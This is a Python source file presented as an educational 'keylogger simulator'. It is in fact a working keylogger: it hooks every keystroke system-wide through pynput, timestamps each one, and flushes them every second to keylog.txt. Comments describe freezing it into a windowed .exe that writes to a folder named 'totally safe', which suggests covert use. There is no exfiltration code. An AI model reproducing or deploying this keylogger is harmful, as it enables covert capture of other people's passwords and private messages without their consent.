# keylogger_simulator.py
# EDUCATIONAL USE ONLY - Keylogger Simulator for Cybersecurity Learning

import sys
import logging
from pynput import keyboard
import datetime
import os
import threading
from pathlib import Path

DIST_DIR = Path(r"C:\Users\Test\key-logger\totally safe\dist")

# Get the log directory (always writes to dist when frozen as .exe, even on Desktop)
if getattr(sys, "frozen", False):
    BASE_DIR = DIST_DIR
    BASE_DIR.mkdir(parents=True, exist_ok=True)
else:
    BASE_DIR = Path(__file__).resolve().parent

log_file = BASE_DIR / "keylog.txt"
log_system = BASE_DIR / "keylogger.log"

# Configure logging (safely handles windowed .pyw where sys.stdout can be None)
handlers = [logging.FileHandler(log_system, encoding="utf-8")]
if sys.stdout is not None:
    handlers.append(logging.StreamHandler(sys.stdout))

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=handlers,
)

log_buffer = []
buffer_lock = threading.Lock()
flush_interval = 1  # Flush buffer to file every 1 second
running = True


def setup_log_file():
    """Initialize the log file with proper permissions."""
    try:
        if not log_file.exists():
            with open(log_file, "w", encoding="utf-8") as f:
                f.write("=== Keylogger Simulator Log - For Educational Use Only ===\n")
            logging.info(f"Created new log file: {log_file}")
        else:
            logging.info(f"Using existing log file: {log_file}")
    except Exception:
        logging.exception("Failed to setup log file")
        raise


def flush_buffer():
    """Flush the log buffer to the file periodically."""
    global log_buffer
    try:
        with buffer_lock:
            if log_buffer:
                with open(log_file, "a", encoding="utf-8") as f:
                    f.writelines(log_buffer)
                log_buffer = []

        if running:
            threading.Timer(flush_interval, flush_buffer).start()
    except Exception:
        logging.exception("Error in flush_buffer")


def format_key(key):
    """Format the key press in a readable way."""
    try:
        if hasattr(key, "char"):
            if key.char and key.char.isprintable():
                return key.char
            return f"[{key}]"
        return f"[{key}]"
    except Exception:
        return "[UNKNOWN]"


def on_press(key):
    """Handle key press events."""
    try:
        formatted_key = format_key(key)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        log_entry = f"{timestamp} - {formatted_key}\n"

        with buffer_lock:
            log_buffer.append(log_entry)

        # For special keys that might indicate a shutdown command
        if key == keyboard.Key.esc:
            logging.info("Escape key pressed - checking for shutdown sequence")
    except Exception:
        logging.exception("Error in on_press")


def cleanup():
    """Cleanup resources before shutdown."""
    global running
    try:
        running = False
        flush_buffer()  # Final flush
        logging.info("Keylogger shutting down cleanly")
    except Exception:
        logging.exception("Error during cleanup")


def main():
    """Main function to run the keylogger."""
    try:
        setup_log_file()
        logging.info("Starting keylogger simulator")
        flush_buffer()  # Start periodic flushing

        with keyboard.Listener(on_press=on_press) as listener:
            logging.info("Keyboard listener started")
            listener.join()

    except Exception:
        logging.exception("Critical error in main")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Received keyboard interrupt")
    except Exception:
        logging.exception("Unhandled exception")
    finally:
        cleanup()
